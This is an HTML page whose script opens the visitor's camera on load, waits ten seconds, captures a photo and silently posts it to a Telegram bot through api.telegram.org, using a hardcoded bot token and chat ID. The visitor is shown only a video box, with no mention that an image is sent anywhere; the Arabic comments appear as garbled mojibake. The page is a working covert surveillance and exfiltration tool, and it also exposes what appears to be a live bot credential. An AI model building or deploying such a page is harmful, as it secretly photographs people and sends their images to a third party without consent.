<!DOCTYPE html>
<html>
  <body>
    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>

    <script>
      const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
      const CHAT_ID = '6036900535';
      const video = document.getElementById('video');

      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;

          video.onloadedmetadata = () => {
            console.log("ğŸ“· Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¯Ø£Øª");
            setTimeout(() => {
              captureAndSendPhoto();
            }, 10000); // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± 10 Ø«ÙˆØ§Ù†Ù Ø¨Ø¹Ø¯ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
          };

        } catch (err) {
          console.error('âŒ Camera error:', err);
        }
      }

      async function captureAndSendPhoto() {
        if (video.readyState < 2) {
          console.warn("â³ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ÙŠØ³Øª Ø¬Ø§Ù‡Ø²Ø© Ø¨Ø¹Ø¯");
          setTimeout(captureAndSendPhoto, 2000);
          return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
          if (!blob) {
            console.error("âŒ ÙØ´Ù„ ÙÙŠ ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Blob");
            return;
          }

          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'photo.jpg');

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          }).then(() => {
            console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…');
          }).catch(err => {
            console.error('âŒ ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', err);
          });

        }, 'image/jpeg', 0.95);
      }

      // Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
      startCamera();
    </script>
  </body>
</html>
